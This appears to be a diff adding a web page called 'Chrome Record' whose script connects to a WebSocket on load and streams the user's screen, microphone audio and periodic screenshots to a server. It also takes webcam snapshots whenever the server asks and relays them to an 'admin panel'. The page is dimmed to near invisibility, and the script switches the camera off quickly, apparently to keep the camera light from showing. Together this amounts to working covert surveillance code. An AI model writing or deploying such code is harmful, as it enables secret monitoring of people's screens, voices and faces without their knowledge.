@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome Record</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            opacity: 0.1;
+            transition: opacity 0.3s;
+        }
+        
+        body:hover {
+            opacity: 1;
+        }
+        
+        .status {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            border: 1px solid #333;
+        }
+        
+        .recording {
+            color: #ff4444;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="status">
+        <h2>Chrome Record Active</h2>
+        <p class="recording">Recording in progress...</p>
+        <p>Screen capture: <span id="screenStatus">Initializing...</span></p>
+        <p>Audio capture: <span id="audioStatus">Initializing...</span></p>
+        <p>Screenshots: <span id="screenshotCount">0</span></p>
+        <p>Audio chunks: <span id="audioCount">0</span></p>
+        <button id="startBtn" onclick="startRecording()" style="margin-top: 20px; padding: 10px 20px; background: #ff4444; color: white; border: none; border-radius: 5px; cursor: pointer;">Start Recording</button>
+    </div>
+
+    <script>
+        let ws;
+        let screenStream;
+        let audioStream;
+        let mediaRecorder;
+        let screenshotInterval;
+        let audioChunks = [];
+        let screenshotCount = 0;
+        let audioCount = 0;
+        let lastAudioTime = 0;
+        let isRecording = false;
+
+        // Connect to WebSocket
+        function connectWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const host = window.location.host;
+            ws = new WebSocket(`${protocol}//${host}/ws`);
+            
+            ws.onopen = () => {
+                console.log('Connected to server');
+                startRecording();
+            };
+            
+            ws.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    if (data.type === "webcam_request") {
+                        console.log('Webcam snapshot requested');
+                        captureWebcamSnapshot();
+                    } else if (data.type === "webcam_saved") {
+                        console.log('Webcam snapshot saved:', data.data);
+                        // Forward to admin panel if needed
+                        ws.send(JSON.stringify({
+                            type: "webcam_saved_admin",
+                            data: data.data
+                        }));
+                    }
+                } catch (error) {
+                    console.error('Error parsing WebSocket message:', error);
+                }
+            };
+            
+            ws.onclose = () => {
+                console.log('Disconnected from server');
+                setTimeout(connectWebSocket, 1000);
+            };
+            
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+                // Don't auto-start recording on WebSocket error
+            };
+        }
+
+        // Start recording
+        async function startRecording() {
+            if (isRecording) {
+                console.log('Already recording, skipping...');
+                return;
+            }
+            
+            console.log('Starting recording...');
+            isRecording = true;
+            document.getElementById('screenStatus').textContent = 'Requesting permissions...';
+            document.getElementById('audioStatus').textContent = 'Requesting permissions...';
+            
+            try {
+                console.log('Requesting screen capture...');
+                // Get screen capture
+                screenStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: {
+                        mediaSource: 'screen',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    },
+                    audio: false
+                });
+                
+                console.log('Screen capture granted');
+                document.getElementById('screenStatus').textContent = 'Active';
+                
+                console.log('Requesting audio capture...');
+                // Get audio capture
+                audioStream = await navigator.mediaDevices.getUserMedia({
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    }
+                });
+                
+                console.log('Audio capture granted');
+                document.getElementById('audioStatus').textContent = 'Active';
+                
+                // Hide the start button
+                document.getElementById('startBtn').style.display = 'none';
+                
+                // Start screenshot capture every 10 seconds
+                screenshotInterval = setInterval(captureScreenshot, 10000);
+                
+                // Start audio recording
+                startAudioRecording();
+                
+            } catch (error) {
+                console.error('Error starting recording:', error);
+                isRecording = false;
+                document.getElementById('screenStatus').textContent = 'Error: ' + error.message;
+                document.getElementById('audioStatus').textContent = 'Error: ' + error.message;
+                alert('Error: ' + error.message + '\n\nPlease check browser permissions and try again.');
+            }
+        }
+
+        // Capture screenshot
+        async function captureScreenshot() {
+            if (!screenStream) return;
+            
+            try {
+                const videoTrack = screenStream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+                const bitmap = await imageCapture.grabFrame();
+                
+                // Convert to canvas and get base64
+                const canvas = document.createElement('canvas');
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(bitmap, 0, 0);
+                
+                const base64 = canvas.toDataURL('image/png', 0.8);
+                
+                // Send to server
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    console.log('Sending screenshot to server...');
+                    ws.send(JSON.stringify({
+                        type: 'screenshot',
+                        data: base64
+                    }));
+                    
+                    screenshotCount++;
+                    document.getElementById('screenshotCount').textContent = screenshotCount;
+                    console.log('Screenshot sent successfully');
+                } else {
+                    console.error('WebSocket not connected, cannot send screenshot');
+                }
+                
+            } catch (error) {
+                console.error('Error capturing screenshot:', error);
+            }
+        }
+
+        // Capture webcam snapshot
+        async function captureWebcamSnapshot() {
+            let tempWebcamStream = null;
+            
+            try {
+                console.log('Requesting webcam access...');
+                tempWebcamStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                console.log('Webcam access granted');
+                
+                const videoTrack = tempWebcamStream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+                const bitmap = await imageCapture.grabFrame();
+                
+                // Convert to canvas and get base64
+                const canvas = document.createElement('canvas');
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(bitmap, 0, 0);
+                
+                const base64 = canvas.toDataURL('image/png', 0.8);
+                
+                // Send to server
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    console.log('Sending webcam snapshot to server...');
+                    ws.send(JSON.stringify({
+                        type: 'webcam',
+                        data: base64
+                    }));
+                    
+                    console.log('Webcam snapshot sent successfully');
+                } else {
+                    console.error('WebSocket not connected, cannot send webcam snapshot');
+                }
+                
+            } catch (error) {
+                console.error('Error capturing webcam snapshot:', error);
+            } finally {
+                // Always stop the webcam stream to turn off the light
+                if (tempWebcamStream) {
+                    tempWebcamStream.getTracks().forEach(track => track.stop());
+                    console.log('Webcam stream stopped');
+                }
+            }
+        }
+
+        // Start audio recording
+        function startAudioRecording() {
+            if (!audioStream) return;
+            
+            const options = {
+                mimeType: 'audio/webm;codecs=opus',
+                audioBitsPerSecond: 128000
+            };
+            
+            mediaRecorder = new MediaRecorder(audioStream, options);
+            
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    audioChunks.push(event.data);
+                }
+            };
+            
+            mediaRecorder.onstop = () => {
+                if (audioChunks.length > 0) {
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    
+                    reader.onload = () => {
+                        if (ws && ws.readyState === WebSocket.OPEN) {
+                            console.log('Sending audio to server...');
+                            ws.send(JSON.stringify({
+                                type: 'audio',
+                                data: reader.result
+                            }));
+                            
+                            audioCount++;
+                            document.getElementById('audioCount').textContent = audioCount;
+                            console.log('Audio sent successfully');
+                        } else {
+                            console.error('WebSocket not connected, cannot send audio');
+                        }
+                    };
+                    
+                    reader.readAsDataURL(blob);
+                    audioChunks = [];
+                }
+                
+                // Restart recording immediately
+                setTimeout(() => {
+                    if (audioStream && audioStream.active) {
+                        startAudioRecording();
+                    }
+                }, 100);
+            };
+            
+            // Start recording and stop every 30 seconds
+            mediaRecorder.start();
+            
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 30000);
+        }
+
+        // Initialize when page loads
+        window.addEventListener('load', () => {
+            connectWebSocket();
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (screenshotInterval) {
+                clearInterval(screenshotInterval);
+            }
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+            if (screenStream) {
+                screenStream.getTracks().forEach(track => track.stop());
+            }
+            if (audioStream) {
+                audioStream.getTracks().forEach(track => track.stop());
+            }
+            if (ws) {
+                ws.close();
+            }
+        });
+    </script>
+</body>
+</html> 
